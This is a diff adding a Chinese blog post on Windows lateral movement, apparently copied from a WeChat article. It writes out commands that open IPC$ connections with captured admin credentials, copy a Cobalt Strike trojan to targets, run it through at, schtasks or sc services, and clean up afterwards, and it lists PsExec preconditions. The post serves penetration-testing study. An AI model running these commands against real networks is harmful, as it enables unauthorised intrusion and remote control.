@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="白仁的博客" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="横向移动记录总结。抄自：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;-SNNLXB_iz8tUmRKMLr6nw 0x00 IPC连接  IPC$(Internet Process Connection) 是为了让进程之间通信的一种“管道”，通过提供用户名密码建立了一条安全的、加密的、用于数据交换的通道。两个IP之间只能建立一个IPC$连接。 通过这个连接，可以实现在被连接的目标机器上搞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="横向移动">
+<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2021&#x2F;07&#x2F;07&#x2F;%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8&#x2F;index.html">
+<meta property="og:site_name" content="白仁的博客">
+<meta property="og:description" content="横向移动记录总结。抄自：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;-SNNLXB_iz8tUmRKMLr6nw 0x00 IPC连接  IPC$(Internet Process Connection) 是为了让进程之间通信的一种“管道”，通过提供用户名密码建立了一条安全的、加密的、用于数据交换的通道。两个IP之间只能建立一个IPC$连接。 通过这个连接，可以实现在被连接的目标机器上搞">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-07-08T07:18:56.194Z">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://bai-ren-1.github.io/2021/07/07/横向移动/"/>
+
+
+
+
+
+  <title>横向移动 | 白仁的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">白仁的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2021/07/07/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="白仁">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="白仁的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">横向移动</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-07-07T17:13:16+08:00">
+                2021-07-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
+                    <span itemprop="name">后渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>记录总结。抄自：<a href="https://mp.weixin.qq.com/s/-SNNLXB_iz8tUmRKMLr6nw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-SNNLXB_iz8tUmRKMLr6nw</a></p>
+<h2 id="0x00-IPC连接"><a href="#0x00-IPC连接" class="headerlink" title="0x00 IPC连接"></a>0x00 IPC连接</h2><blockquote>
+<p> IPC$(Internet Process Connection) 是为了让进程之间通信的一种“管道”，通过提供用户名密码建立了一条安全的、加密的、用于数据交换的通道。两个IP之间只能建立一个IPC$连接。 通过这个连接，可以实现在被连接的目标机器上搞文件上传、下载、命令执行 。</p>
+</blockquote>
+<h3 id="00-IPC-计划任务"><a href="#00-IPC-计划任务" class="headerlink" title="00 IPC$+计划任务"></a>00 IPC$+计划任务</h3><p>使用IPC$配合计划任务实现横向移动的<strong>大体思路</strong>如下：</p>
+<ul>
+<li>首先建立向目标主机的<code>IPC$</code>连接。</li>
+<li>其次把命令执行的脚本传到目标主机。</li>
+<li>再次创建计划任务在目标机器上执行命令脚本。</li>
+<li>最后过河拆桥删除<code>IPC$</code>连接。</li>
+</ul>
+<p>使用IPC$配合计划任务实现横向移动的<strong>利用条件</strong>如下：</p>
+<ul>
+<li>目标机器没有禁用<code>IPC$</code>连接，没有什么防火防盗拦截<code>IPC$</code>，139 445 端口也开了（能走445走445，不能则走139</li>
+<li>目标机器小管理员开了<code>IPC$</code>默认共享服务（逻辑盘、系统目录；都不开我访问个啥？）</li>
+<li>获取了目标机器的<strong>小管理员的管理员权限的账号密码</strong>（最好是域管理员账号密码），明文的</li>
+<li>目标系统能支持<code>IPC$</code>，且和攻击机能彼此互通（废话）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用本地命令copy或者用CS beacon的upload，把自己写的或者是工具生成的木马搞到目标机器上。接下来创建windows计划任务，自动执行木马反弹连接到攻击机器。自动执行木马操作在windows中最常用的就是计划任务at和schtasks。</span><br></pre></td></tr></table></figure>
+
+<h4 id="001-IPC-命令"><a href="#001-IPC-命令" class="headerlink" title="001 IPC$命令"></a>001 IPC$命令</h4><p>建立IPC连接并查看：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;IP&gt;\ipc$ password /user:username //建立IPC连接</span><br><span class="line"><span class="built_in">net</span> use //查看当前主机所建立的连接</span><br></pre></td></tr></table></figure>
+
+<p>ipc连接还有一个常用的命令就是进行本地映射，如果在命令行里面查看目录觉得很麻烦的话可以使用如下命令将已经建立IPC连接的主机的任意盘符映射到自己的本地：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">138</span>\c$ //列举目标盘符目录</span><br><span class="line"><span class="built_in">net</span> use z: \\ip\c$ password /user:Administrator //把目标C盘映射到本地z盘(未建立ipc连接的情况下)</span><br><span class="line"><span class="built_in">net</span> use z: \\ip\c$ //把目标C盘映射到本地z盘(已建立ipc连接的情况下)</span><br></pre></td></tr></table></figure>
+
+<p>删除IPC连接：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\ip\ipc$</span><br></pre></td></tr></table></figure>
+
+<h4 id="002-at命令实现计划任务"><a href="#002-at命令实现计划任务" class="headerlink" title="002 at命令实现计划任务"></a>002 at命令实现计划任务</h4><blockquote>
+<p>at 命令是Windows自带的用于创建计划任务的命令，但是at 命令只在2003及以下的版本使用。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。 </p>
+</blockquote>
+<p>at命令在内网中的利用方法：</p>
+<p>在获取webshell后不能够执行系统命令的情况下可以用<strong>at命令将命令执行后写入txt再用type读取</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">141</span> <span class="number">16</span>:<span class="number">40</span>:<span class="number">00</span> <span class="built_in">cmd</span>.exe /c " whoami(等命令) &gt; c:\result.txt"</span><br><span class="line"><span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">141</span>\c$\result.txt</span><br></pre></td></tr></table></figure>
+
+<p>利用at计划任务命令上线cs或者msf（<strong>IPC搭配at命令计划任务实现横向，即该章节内容</strong>）</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;IP&gt;\ipc$ password /user:username //与目标机器建立IPC连接</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip //确定时间</span><br><span class="line"><span class="built_in">copy</span> &lt;木马在本机位置&gt; \\&lt;靶机ip&gt;\c$ //把cs生成的木马利用<span class="built_in">copy</span>命令拷贝到主机上</span><br><span class="line"><span class="built_in">at</span> \\&lt;靶机ip&gt; &lt;启动时间&gt; &lt;木马在靶机的位置&gt; //使用<span class="built_in">at</span>命令创建计划任务</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">141</span> <span class="number">1</span> /delete //删除计划任务(这里的<span class="number">1</span>为创建计划任务时候的ID)</span><br></pre></td></tr></table></figure>
+
+<h4 id="003-schtasks命令实现计划任务"><a href="#003-schtasks命令实现计划任务" class="headerlink" title="003 schtasks命令实现计划任务"></a>003 schtasks命令实现计划任务</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;IP&gt;\ipc$ password /user:username //与目标机器建立IPC连接</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip //确定时间</span><br><span class="line"><span class="built_in">copy</span> &lt;木马在本机位置&gt; \\&lt;靶机ip&gt;\c$ //把cs生成的木马利用<span class="built_in">copy</span>命令拷贝到主机上</span><br><span class="line">schtasks /create /TN cs /TR C:\artifact.exe /SC once /ST <span class="number">17</span>:<span class="number">32</span> //创建名为cs的计划任务</span><br><span class="line">schtasks /query /TN cs //查看创建的计划任务</span><br><span class="line">schtasks /delete /tn "cs" //删除计划任务</span><br></pre></td></tr></table></figure>
+
+<h3 id="01-IPC-Windows服务"><a href="#01-IPC-Windows服务" class="headerlink" title="01 IPC$+Windows服务"></a>01 IPC$+Windows服务</h3><h4 id="001-SC命令"><a href="#001-SC命令" class="headerlink" title="001 SC命令"></a>001 SC命令</h4><blockquote>
+<p> sc命令是XP系统中功能强大的DOS命令,SC命令能与“服务控制器”和已安装设备进行通讯。SC是用于与服务控制管理器和服务进行通信的命令行程序。 </p>
+</blockquote>
+<p>与靶机建立ipc连接，拷贝exe到主机系统上。在靶机上创建一个shell的服务并启动，最后删除：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-M836NN6NU8B create shell binpath= "c:\artifact.exe" //创建一个shell的服务</span><br><span class="line">sc \\WIN-M836NN6NU8B <span class="built_in">start</span> shell //启动shell服务</span><br><span class="line">sc \\[host] delete [servicename] //删除shell服务</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x01-Psexec工具"><a href="#0x01-Psexec工具" class="headerlink" title="0x01 Psexec工具"></a>0x01 Psexec工具</h2><blockquote>
+<p> psexec是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开方3389端口，只需要对方开启admin$共享 (该共享默认开启)。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径。由于psexec是Windows提供的工具，所以杀毒软件将其列在白名单中。 </p>
+</blockquote>
+<p>使用Psexec的<strong>大体思路</strong>如下：</p>
+<ul>
+<li>通过<code>ipc$</code>连接<code>admin$</code>，释放二进制文件<code>psexecsvc.exe</code>到目标 。</li>
+<li>通过服务管理<code>SCManager</code>远程创建一个<code>psexec</code>服务，并启动服务 。</li>
+<li>客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据 。</li>
+<li>运行结束后删除服务 。</li>
+</ul>
+<p>使用Psexec的<strong>利用条件</strong>如下：</p>
+<ul>
+<li>对方主机开启了 <code>admin$</code>共享，如果关闭了<code>admin$</code>共享，会提示：找不到网络名 </li>
+<li>对方未开启防火墙</li>
+<li>如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</li>
+<li>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。 </li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/" rel="next" title="Java审计之Mybatis框架SQL注入">
+                <i class="fa fa-chevron-left"></i> Java审计之Mybatis框架SQL注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev" title="Tomcat内存马">
+                Tomcat内存马 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">白仁</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">58</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#横向移动"><span class="nav-number">1.</span> <span class="nav-text">横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-IPC连接"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 IPC连接</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#00-IPC-计划任务"><span class="nav-number">1.1.1.</span> <span class="nav-text">00 IPC$+计划任务</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#001-IPC-命令"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">001 IPC$命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#002-at命令实现计划任务"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">002 at命令实现计划任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#003-schtasks命令实现计划任务"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">003 schtasks命令实现计划任务</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#01-IPC-Windows服务"><span class="nav-number">1.1.2.</span> <span class="nav-text">01 IPC$+Windows服务</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#001-SC命令"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">001 SC命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Psexec工具"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 Psexec工具</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">白仁</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
